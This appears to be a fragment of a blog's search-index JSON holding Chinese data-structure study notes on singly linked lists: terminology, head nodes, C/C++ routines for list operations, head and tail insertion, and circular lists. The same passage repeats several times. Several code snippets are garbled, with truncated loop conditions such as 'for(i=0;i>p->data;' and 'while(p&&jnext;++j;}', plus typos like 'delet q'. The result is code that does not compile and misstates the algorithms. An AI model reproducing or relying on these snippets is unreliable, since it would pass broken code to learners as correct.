2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#头结点数据域装什么"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#链表的特点"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#单链表的储存结构"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#单链表基本操作的实现"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 头插法时间复杂度：O(n) 尾插法——元素插入在链表尾部，也叫后插法 1.从一个空表L开始，将新结点逐个插入到链表尾部，尾指针r指向链表的尾结点。 2.初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点。 void CreateList_R(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; r=L; //尾指针r指向头结点 for(i=0;i\u003ep-\u003edata; //生成新结点，输入元素值 p-\u003enext=NULL; r-\u003enext=p; //插入到表尾 } } 循环链表是一种头尾相接的链表（表中最后一个结点的指针域指向头结点，整个链表形成一个环 **优点：**从表中任一结点出发均可找到表中其他结点 **注意：**由于循环链表中没有NULL指针，故设计遍历操作时，其终止条件就不再像非循环链表那样判断p或p-\u003enext是否为空，而是判断它们是否等于头指针。 循环条件： 表的操作常常是在表的首尾位置上进行 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#时间效率分析"},{"categories":["notice"],"content":"\r4链式表示和实现**链式存储结构：**结点在储存器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻。 线性表的链式表示又称为非顺序映像和链式映像 用一组物理位置任意的存储单元来存放线性表的数据元素，这组存储单元既可以是连续的，也可以是不连续的，甚至是零散分布在内存中的任意位置上。链表中的逻辑次序和物理次序不一定相同。 链式存储有关的术语1.结点：数据元素的存储映像。由数据域和指针域两部分组成 2.链表：n个结点由指针链组成一个链表 带头单链结点表示意图： 3.单链表：结点只有一个指针域的链表，称为单链表或线性链表 4.双链表：结点有两个指针域的链表 5.循环链表：首尾相接的链表 6.头指针：指向链表中第一个结点的指针 7.首元结点：链表中存储第一个数据元素a1的结点 8.头结点：在链表的首元结点之前附设的一个结点 两种形式： 如何表示空表无头结点时，头指针为空时表示空表 有头结点时，当头结点的指针域为空时表示空表 设置结点有什么好处1.便于首元结点的处理（无需对首元结点进行特殊处理） 2.便于空表和非空表的统一处理 头结点数据域装什么头结点的数据域可以为空，也可以存放线性表长度等附加信息，但此结点不能计入链表长度值 链表的特点1）结点在储存器中的位置时任意的 2）访问时只能通过头指针进入链表，并通过每个结点的指针域一次向后顺序扫描其余结点，寻找第一个结点和最后一个结点所花费的时间不等 3）顺序表时随机存存取，连表示顺序存取 单链表的储存结构\r单链表定义： typedef struct Lnode{ ElemType data; //结点的数据域 struct Lnode *next; //结点的指针域 }Lnode,*LinkList; 案例：为统一链表操作，通常这样定义： typedef Struct{ char num[8]; //数据域 char name[8]; //数据域 int score; //数据域 }ElemType; typedef struct Lnode{ ElemType data; //数据域 struct Lnode *next; //指针域 }Lnode,*LinkList; 单链表基本操作的实现单链表初始化（构造一个空表） 算法步骤： 1)生成新结点作头结点，用头指针L指向头结点 2)将头结点的指针域置空 Status InitList_L(LinkList \u0026L){ L=new LNode; //或L=(LinkList)malloc(sizeof(LNode)); L-\u003enext=NULL; return OK; } 判断链表是否为空 即判断头结点指针域是否为空 空表：链表中无元素，称为空链表（头指针和头结点仍然在） int ListEmpty(LinkList L){ if(L-\u003enext) //非空 return 0; else return 1; } 单链表的销毁：链表销毁后不存在 从头指针开始，依次释放所有结点 Status DestroyList_L(LinkList \u0026L){ Lnode *p; while(L){ p=L; L=L-\u003enext; delete p; } return OK; } 清空链表 链表仍存在，但链表中无元素，称为空链表（头指针和头结点仍然在） 依次释放所有结点，并将头结点指针域设置为空 Status ClearList(LinkList \u0026L){ Lnode *p,*q; p=L-\u003enext; while(p){ q=p-\u003enext; delete p; p=q } L-\u003enext=NULL; return OK; } 求单链表的表长 int ListLength_L(LinkList L){ LinkList p; p=L-\u003enext; i=0; while(p){ i++; p=p-\u003enext; } return i; } 取单链表中第i个元素的内容 Status GetElem_L(LinkList L,int i,ElemType \u0026e){ p=L-\u003enext;j=1; while(p\u0026\u0026jnext;++j; } if(!p||j\u003ei)return ERROR; e=p-\u003edata; return OK; }//GetElem_L 按值查找(根据指定数据获取该数据所在地址) Lnode *LocateElem_L(LinkList L,ElemType e){ p=L-\u003enext; while(p\u0026\u0026p-\u003edata!=e){ p=p-\u003enext; } return p; } 按值查找(根据指定数据获取数据位置序号) int LocateElem_L(LinkList L, ElemType e){ p=L-\u003enext; j=1; while(p\u0026\u0026P-\u003edata!=e) {p=p-\u003enext; j++;} if(p) return j; else return 0; } 插入(在第i个结点前插入值为e的新结点) Status ListInsert_L(LinkList \u0026L,int i,ElemType e){ p=L;j=0; while(p\u0026\u0026jnext;++j;} if(!p||j\u003ei-1) return ERROR; s=new LNode; s-\u003edata=e; s-\u003enext=p-\u003enext; p-\u003enext=s; return OK; }//ListInsert_L 删除(删除第i个结点) Status ListDelete_L(LinkList \u0026L,int i,ElemType \u0026e){ p=L;j=0; while(p-\u003enext\u0026jnext;++j;} //寻找第i结点，并令p指向其前驱 if(!(p-\u003enext)||j\u003ei-1)return ERROR; q=p-\u003enext; p-\u003enext=q-\u003enext; e=q-\u003edata; delet q; return OK; } 时间效率分析1.查找： 因为线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为：O(n) 2.插入和删除： 因为线性表不需要移动元素，只需要修改指针，一般情况下时间复杂度为O(1) 但如果要在单链表中进行前插或删除操作，由于要从头查找前驱结点，所耗时间复杂度为O(n) 建立单链表头插法——元素插入在链表头部，也叫前插法 1.从一个空表开始，重复读入数据； 2.生成新结点，将读入数据存放到新结点的数据域中 3.从最后一个结点开始，依次将个节点插入到链表的前端 构造一个新结点 L=new LNode; //C++语法 L=(LinkList)malloc(sizeof(LNode)); //C语言语法 算法： void CreateList_H(LinkList \u0026L,int n){ L=new LNode; L-\u003enext=NULL; //建立一个带头结点的单链表 for(i=n;i\u003e0;--i){ p=new LNode; cin\u003e\u003ep-\u003edata; //输入元素 p-\u003enext=L-\u003enext; //输入表头 L-\u003enext=p; } } 